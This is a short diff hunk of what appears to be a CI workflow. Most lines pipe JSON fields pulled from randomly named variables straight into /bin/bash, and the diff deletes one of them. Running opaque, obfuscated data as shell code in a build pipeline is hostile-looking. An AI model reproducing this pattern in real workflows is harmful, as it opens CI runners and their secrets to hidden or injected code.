@@ -24,7 +24,6 @@ jobs:
           echo $pyy675 | jq -r .wnm193 | /bin/bash
           echo $zpfan799 | jq -r .ybk87 | /bin/bash
           echo $tuaul177 | jq -r .agoa7 | /bin/bash
-          printf '%s' "$hl240" | jq -r .w116 | /bin/bash
           printf '%s' "$g8" | jq -r .ko98 | /bin/bash
           echo $hp04 | jq -r .nah64 | /bin/bash
 
